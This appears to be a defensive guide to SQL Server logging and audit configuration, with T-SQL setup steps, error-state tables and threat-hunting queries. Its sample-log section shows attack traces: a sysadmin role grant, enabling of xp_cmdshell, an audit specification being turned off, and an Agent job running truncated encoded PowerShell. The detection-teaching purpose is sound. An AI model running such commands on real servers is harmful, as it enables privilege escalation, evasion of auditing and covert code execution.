Microsoft SQL Server Logs

SQL Server Log Overview

Microsoft SQL Server produces several independent streams of log data, and no single one of them tells the whole story. The SQL Server Error Log records engine health, startup parameters, and by default every failed login. SQL Server Audit, built on Extended Events, is the purpose-built security auditing framework that writes structured records of logons, permission changes, schema modifications, and data access. The Default Trace quietly captures a small set of high-value configuration and DDL events even when nothing else is enabled, and the Windows Application and Security event logs receive a mirrored copy of login auditing.

The distinction matters operationally. A default SQL Server installation logs failed logins only, which means an attacker who successfully authenticates with stolen credentials, escalates privileges, and exfiltrates a customer table produces almost no evidence. Turning on SQL Server Audit with the correct action groups is what converts the database from a blind spot into a monitored asset. Both NIST SP 800-92 and the Saudi NCA Essential Cybersecurity Controls require auditing of privileged account activity and access to sensitive data, and for a database tier that requirement is satisfied by a server audit specification, not by the error log alone.

SQL Server Audit writes to one of three targets: a binary .sqlaudit file, the Windows Application log, or the Windows Security log. The file target is the most reliable and the highest performing, and it can be read back into T-SQL through sys.fn_get_audit_file or shipped to a SIEM. The Security log target offers the strongest tamper resistance because a database administrator cannot clear it without Windows-level privileges, which is precisely why it is preferred in high-assurance environments where the DBA is inside the threat model.

Key SQL Server Log Types

SQL Server generates several distinct log types that serve different monitoring and forensic purposes. Understanding which stream holds which evidence is essential when reconstructing an incident:

Log Type Description
SQL Server Error Log The primary operational log, written as a plain text file (ERRORLOG) and cycled on every service restart. Records service startup and shutdown, database recovery, backup and restore operations, memory and I/O warnings, and login auditing messages such as error 18456. This is the first log to check when the instance behaves abnormally.
SQL Server Audit The dedicated security audit framework introduced in SQL Server 2008 and available in all editions since 2016 SP1. Writes structured, tamper-evident records for server-level and database-level actions defined by audit specifications. This is the authoritative source for privileged activity, permission changes, and sensitive data access.
Default Trace A lightweight server-side trace enabled by default that retains a rolling set of five 20 MB trace files. Captures object creation and deletion, database changes, security-relevant configuration modifications, log file growth, and audit changes. Extremely valuable in incident response because it is often the only evidence present on an unmonitored server.
Extended Events (XEvents) The modern, low-overhead event tracing engine that replaced SQL Trace and Profiler. Highly flexible sessions can capture statement execution, errors, deadlocks, and login activity with fine-grained filtering. The system_health session runs by default and retains recent errors, deadlocks, and severity 20+ events.
Windows Application / Security Log SQL Server mirrors login auditing and severe engine errors into the Windows Application log under the source MSSQLSERVER or MSSQL$<InstanceName>. SQL Server Audit can additionally target the Windows Security log, which cannot be cleared by a DBA and is therefore the tamper-resistant option.
SQL Server Agent Log Records job execution history, job step failures, alert firing, and Agent service events. Frequently overlooked, yet SQL Agent jobs are a common persistence mechanism because they run under privileged service accounts and can execute operating system commands or PowerShell.
Transaction Log (LDF) The write-ahead log that guarantees durability and supports point-in-time recovery. Not a security log and not human readable, but forensically valuable: with the right tooling it can reveal DELETE and UPDATE operations that were never captured by any audit, provided the log has not yet been truncated.
Pro Tip: The Default Trace is the single highest-value artifact on an otherwise unmonitored SQL Server. Before an attacker has a chance to overwrite it, query sys.fn_trace_gettable for event class 164 (Object:Altered) and 46 (Object:Created) to see what changed and when.

Enabling SQL Server Auditing

SQL Server Audit is created in three steps: define the audit object and its destination, attach a server audit specification listing the action groups to capture, then enable both. All statements below require CONTROL SERVER permission.

Step 1: Create the Server Audit Object

USE master; GO CREATE SERVER AUDIT [HTL_Security_Audit] TO FILE ( FILEPATH = 'D:\SQLAudit\' , MAXSIZE = 256 MB , MAX_ROLLOVER_FILES = 50 , RESERVE_DISK_SPACE = OFF ) WITH ( QUEUE_DELAY = 1000 , ON_FAILURE = CONTINUE , AUDIT_GUID = NEWID() ); GO
Creates a file-based audit retaining up to 50 rollover files of 256 MB each. QUEUE_DELAY of 1000 ms buffers writes for performance; set it to 0 for synchronous, guaranteed-write auditing at the cost of throughput.

Step 2: Create the Server Audit Specification

CREATE SERVER AUDIT SPECIFICATION [HTL_Server_Spec] FOR SERVER AUDIT [HTL_Security_Audit] ADD (FAILED_LOGIN_GROUP), ADD (SUCCESSFUL_LOGIN_GROUP), ADD (LOGOUT_GROUP), ADD (SERVER_ROLE_MEMBER_CHANGE_GROUP), ADD (DATABASE_ROLE_MEMBER_CHANGE_GROUP), ADD (SERVER_PERMISSION_CHANGE_GROUP), ADD (DATABASE_PERMISSION_CHANGE_GROUP), ADD (SERVER_PRINCIPAL_CHANGE_GROUP), ADD (DATABASE_PRINCIPAL_CHANGE_GROUP), ADD (SCHEMA_OBJECT_CHANGE_GROUP), ADD (DATABASE_CHANGE_GROUP), ADD (SERVER_OBJECT_CHANGE_GROUP), ADD (AUDIT_CHANGE_GROUP), ADD (BACKUP_RESTORE_GROUP), ADD (DBCC_GROUP) WITH (STATE = ON); GO
Captures authentication, privilege and role changes, schema modifications, backup activity, and any attempt to tamper with the audit configuration itself. AUDIT_CHANGE_GROUP is mandatory: it is what tells you the attacker disabled your auditing.

Step 3: Enable the Audit

ALTER SERVER AUDIT [HTL_Security_Audit] WITH (STATE = ON); GO -- Verify the audit is running SELECT a.name, a.is_state_enabled, a.on_failure_desc, f.log_file_path FROM sys.server_audits a LEFT JOIN sys.server_file_audits f ON a.audit_id = f.audit_id;
The audit object must be enabled separately from the specification. Confirm is_state_enabled returns 1 for both the audit and the specification, otherwise records are silently discarded.

Step 4: Audit Sensitive Data Access at the Database Level

USE [CustomerDB]; GO CREATE DATABASE AUDIT SPECIFICATION [HTL_PII_Access] FOR SERVER AUDIT [HTL_Security_Audit] ADD (SELECT, UPDATE, DELETE ON dbo.Customers BY public), ADD (SELECT ON dbo.PaymentCards BY public), ADD (EXECUTE ON SCHEMA::dbo BY public) WITH (STATE = ON); GO
Server-level auditing does not record row access. To satisfy sensitive-data monitoring requirements you must add a database audit specification naming the specific tables that hold regulated data.

Step 5: Set Login Auditing to Capture Both Success and Failure

EXEC xp_instance_regwrite N'HKEY_LOCAL_MACHINE', N'Software\Microsoft\MSSQLServer\MSSQLServer', N'AuditLevel', REG_DWORD, 3; GO -- 0 = None, 1 = Successful logins, 2 = Failed logins (default), 3 = Both -- Requires a service restart to take effect
Sets the legacy login auditing level that writes to the error log and Windows Application log. This is independent of SQL Server Audit and provides a useful secondary source, but it requires a service restart.
Security Note: ON_FAILURE = CONTINUE keeps the instance available if the audit target becomes unwritable, but it means auditing can silently stop. In regulated environments consider ON_FAILURE = SHUTDOWN or FAIL_OPERATION so that loss of audit capability is treated as a failure condition rather than an inconvenience.

Recommended Audit Action Groups

SQL Server exposes more than eighty audit action groups. Enabling all of them generates unusable volume. The groups below represent a balanced baseline that satisfies common regulatory requirements while keeping event rates manageable.

FAILED_LOGIN_GROUP

Records every unsuccessful authentication attempt against the instance. The foundation for brute force and password spraying detection.
Enable Critical

SUCCESSFUL_LOGIN_GROUP

Records successful authentications. High volume on busy instances, but without it a compromised credential is invisible. Filter rather than disable.
Enable Critical

SERVER_ROLE_MEMBER_CHANGE_GROUP

Fires when a login is added to or removed from a fixed server role. Adding an account to sysadmin is the single most important privilege escalation event on the instance.
Enable Critical

AUDIT_CHANGE_GROUP

Captures creation, modification, and deletion of audit objects and specifications. This is the anti-tampering control that reveals an attacker turning your logging off.
Enable Critical

SERVER_PERMISSION_CHANGE_GROUP

Records GRANT, REVOKE, and DENY of server-scoped permissions such as CONTROL SERVER, IMPERSONATE, and ALTER ANY LOGIN.
Enable High Risk

SCHEMA_OBJECT_CHANGE_GROUP

Captures CREATE, ALTER, and DROP against schema objects. Detects malicious stored procedures, trigger-based persistence, and destructive DDL.
Enable High Risk

SERVER_PRINCIPAL_CHANGE_GROUP

Fires on creation, alteration, and deletion of logins, including password changes and account enabling. Detects attacker-created backdoor accounts.
Enable High Risk

BACKUP_RESTORE_GROUP

Records BACKUP and RESTORE operations. An unscheduled backup written to a network share or local temp folder is a classic bulk exfiltration technique.
Enable High Risk

DBCC_GROUP

Captures DBCC command execution. Undocumented DBCC commands are used to read memory, dump page contents, and manipulate the engine in ways that bypass normal access control.
Enable Medium Risk
Security Note: Action groups are all-or-nothing at the server level and cannot be filtered by login inside the specification. If SUCCESSFUL_LOGIN_GROUP volume is unmanageable, apply a WHERE predicate on the audit object using ALTER SERVER AUDIT ... WHERE server_principal_name <> 'app_service_account' rather than dropping the group entirely.

Critical SQL Server Event IDs

These error numbers appear in the SQL Server Error Log and the Windows Application log. Error 18456 in particular carries a state code that reveals exactly why authentication failed, which is what separates a mistyped password from a targeted attack.

Event / Error Meaning Why It Matters
18456 State 5 Login attempted with a user name that does not exist Username enumeration or password spraying against guessed account names
18456 State 8 Password mismatch for a valid login Classic brute force indicator when repeated against the same account
18456 State 11 / 12 Valid Windows login but server access denied A domain account probing the instance without an explicit grant, common in lateral movement
18456 State 18 Password must be changed Indicates use of a stale or newly provisioned account, often a forgotten default
18456 State 38 Login valid but the requested database is inaccessible Reconnaissance enumerating which databases a compromised account can reach
18453 / 18454 Successful login using Windows or SQL authentication Baseline for detecting logons from unexpected hosts, applications, or hours
17806 SSPI handshake failed Kerberos or NTLM failure, frequently seen during relay attacks and misconfigured SPNs
15457 Configuration option changed Fires when sp_configure alters a setting such as xp_cmdshell or CLR enabled
3041 Backup failed to complete May indicate ransomware interfering with backups or an attacker probing backup paths
825 Read-retry required on a page Early warning of storage corruption that can also result from destructive tampering
Pro Tip: SQL Server deliberately reports state 1 to the client for almost every 18456 failure to avoid leaking information to an attacker. The real state code is only written to the error log, so client-side application logs are useless for this analysis.

SQL Server Log Analysis Queries

Use these T-SQL and SIEM queries to hunt for authentication attacks, privilege escalation, configuration tampering, and bulk data access on SQL Server.

Read the Audit File
SQL> SELECT event_time, action_id, succeeded, server_principal_name, client_ip, statement FROM sys.fn_get_audit_file('D:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT) ORDER BY event_time DESC;
Reads the binary audit files back into a queryable result set. Wildcards let you span all rollover files at once.
Brute Force Detection
SQL> SELECT client_ip, server_principal_name, COUNT(*) AS Failures FROM sys.fn_get_audit_file('D:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT) WHERE action_id = 'LGIF' AND event_time > DATEADD(HOUR, -1, GETUTCDATE()) GROUP BY client_ip, server_principal_name HAVING COUNT(*) > 10;
Surfaces source IPs generating more than ten failed logins in an hour, the signature of credential guessing.
Sysadmin Role Additions
SQL> SELECT event_time, server_principal_name, target_server_principal_name, statement FROM sys.fn_get_audit_file('D:\SQLAudit\*.sqlaudit', DEFAULT, DEFAULT) WHERE action_id IN ('APRL','ADSP') AND statement LIKE '%sysadmin%';
Detects any login being granted membership in the sysadmin fixed server role, the top privilege escalation event.
xp_cmdshell Enabled
SQL> SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled','Ad Hoc Distributed Queries') AND value_in_use = 1;
Any of these returning 1 means the instance can execute code outside the database engine. Alert on the change event, not just the state.
Default Trace: Object Changes
SQL> SELECT StartTime, LoginName, HostName, ApplicationName, DatabaseName, ObjectName, EventClass FROM sys.fn_trace_gettable(CONVERT(VARCHAR(500), (SELECT TOP 1 [path] FROM sys.traces WHERE is_default = 1)), DEFAULT) WHERE EventClass IN (46, 47, 164) ORDER BY StartTime DESC;
Pulls object created (46), deleted (47), and altered (164) events from the Default Trace. Often the only DDL evidence on an unaudited server.
Error Log Failed Logins
SQL> EXEC xp_readerrorlog 0, 1, N'Login failed', NULL, NULL, NULL, N'desc';
Searches the current error log for failed logins including the true state code. Change the first parameter to read archived logs.
Unexpected Backup Activity
SQL> SELECT bs.database_name, bs.backup_start_date, bs.user_name, bmf.physical_device_name FROM msdb.dbo.backupset bs JOIN msdb.dbo.backupmediafamily bmf ON bs.media_set_id = bmf.media_set_id WHERE bmf.physical_device_name LIKE '\\\\%' OR bmf.physical_device_name LIKE 'C:\Users\%' ORDER BY bs.backup_start_date DESC;
Finds backups written to UNC paths or user profile folders instead of the approved backup target, a strong exfiltration indicator.
Linked Server Inventory
SQL> SELECT s.name, s.data_source, s.is_rpc_out_enabled, l.remote_name FROM sys.servers s LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id WHERE s.is_linked = 1;
Linked servers with RPC out enabled allow command execution to pivot between instances. Any unexpected entry warrants investigation.
Off-Hours Sensitive Table Access
SIEM> source="mssql:audit" object_name IN ("PaymentCards","Customers") | eval hr=strftime(_time,"%H") | where hr<6 OR hr>20 | stats count by server_principal_name, client_ip, object_name
Correlates access to regulated tables outside business hours, one of the highest fidelity insider threat signals.
Audit Tampering
SIEM> source="mssql:audit" action_id IN ("AUSC","AUAC","ASSC") | table _time, server_principal_name, client_ip, statement
Any change to an audit object or specification should be alerted on immediately. Legitimate changes are rare and scheduled.

Best Practices for SQL Server Logging

Apply these practices to make SQL Server logging complete, durable, and actually usable during an investigation:

01

Forward Audit Logs Off the Host

An attacker with sysadmin can delete .sqlaudit files. Ship audit records to a SIEM continuously, or target the Windows Security log, so that evidence survives compromise of the database itself.

02

Increase Error Log Retention

SQL Server keeps only six archived error logs by default and cycles on every restart. Raise the count to at least 30 and schedule sp_cycle_errorlog nightly so a restart cannot destroy weeks of history.

03

Always Audit the Auditors

Include AUDIT_CHANGE_GROUP in every server audit specification and alert on it in real time. Disabling auditing is a standard step in the attacker playbook and should never happen silently.

04

Audit Sensitive Tables Explicitly

Server-level audit specifications never record row access. Identify tables holding personal, financial, or health data and create database audit specifications naming those objects directly.

05

Separate the Audit Volume

Write audit files to a dedicated disk with its own capacity monitoring. If the audit target fills up under ON_FAILURE = CONTINUE, auditing stops while the database happily keeps serving queries.

06

Baseline Application Identities

Record which application names, host names, and source IPs each service account normally uses. A service account logging in from sqlcmd or SSMS instead of its application is an immediate red flag.

07

Synchronize Time to a Trusted Source

SQL Server Audit stamps events in UTC while the error log uses local server time. Ensure NTP synchronization and normalize both to UTC at ingest so correlation across sources holds up.

08

Preserve the Default Trace

Do not disable the Default Trace for performance reasons. Its overhead is negligible and it regularly provides the only surviving record of schema and configuration changes on unmonitored instances.

Common SQL Server Log Examples

Recognising how attacks appear in real SQL Server log output is what turns configuration into detection. Below are representative entries from the error log and SQL Server Audit.

Failed Login: Password Mismatch (Brute Force)

2025-07-14 09:41:22.81 Logon Error: 18456, Severity: 14, State: 8. 2025-07-14 09:41:22.81 Logon Login failed for user 'sa'. Reason: Password did not match that for the login provided. [CLIENT: 203.0.113.77]
State 8 confirms the login exists and the password was wrong. Repeated entries for 'sa' from a single external IP is textbook brute force against the built-in administrator account.

Failed Login: Unknown User (Account Enumeration)

2025-07-14 09:43:07.12 Logon Error: 18456, Severity: 14, State: 5. 2025-07-14 09:43:07.12 Logon Login failed for user 'admin'. Reason: Could not find a login matching the name provided. [CLIENT: 203.0.113.77]
State 5 means the account name itself does not exist. A rapid series of state 5 events with different usernames from one source is enumeration, not a user error.

Privilege Escalation: Sysadmin Role Granted

event_time action_id succeeded server_principal_name target_server_principal_name statement 2025-07-14 10:02:55.447 APRL 1 svc_reporting bkp_admin ALTER SERVER ROLE [sysadmin] ADD MEMBER [bkp_admin]; client_ip = 10.20.4.87 application_name = Microsoft SQL Server Management Studio host_name = WKS-FIN-014
A service account (svc_reporting) adding another login to sysadmin from an interactive SSMS session on a finance workstation. Service accounts should never perform role changes interactively.

Command Execution: xp_cmdshell Enabled

2025-07-14 10:05:31.09 spid73 Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 2025-07-14 10:05:31.44 spid73 Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
The two-step pattern of enabling advanced options followed immediately by xp_cmdshell is the standard route from SQL injection or a compromised sysadmin account to operating system command execution.

Data Exfiltration: Bulk Read of a Sensitive Table

event_time action_id succeeded server_principal_name database_name object_name statement 2025-07-14 02:17:44.902 SL 1 svc_reporting CustomerDB PaymentCards SELECT * FROM dbo.PaymentCards client_ip = 10.20.4.87 application_name = sqlcmd host_name = WKS-FIN-014 session_id = 73
An unfiltered SELECT against a payment card table at 02:17 using sqlcmd rather than the reporting application. Time of day, tool, and lack of a WHERE clause together make this high confidence.

Anti-Forensics: Audit Specification Disabled

event_time action_id succeeded server_principal_name statement 2025-07-14 10:11:03.276 ASSC 1 bkp_admin ALTER SERVER AUDIT SPECIFICATION [HTL_Server_Spec] WITH (STATE = OFF); client_ip = 10.20.4.87 application_name = Microsoft SQL Server Management Studio
The newly escalated account immediately turns off auditing. Because AUDIT_CHANGE_GROUP was enabled, this final action was itself recorded before logging stopped.

Persistence: SQL Agent Job Running OS Commands

2025-07-14 10:24:18 - ! [298] SQLServer Error: 22022, Job 'IndexMaintenance_Nightly' step 2 subsystem 'CmdExec' command: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... 2025-07-14 10:24:19 - + [396] An idle CPU condition has not been defined - OnIdle job schedules will have no effect
A maintenance job modified to run base64-encoded PowerShell through the CmdExec subsystem. SQL Agent jobs execute under the Agent service account and are a durable persistence mechanism that survives reboots.
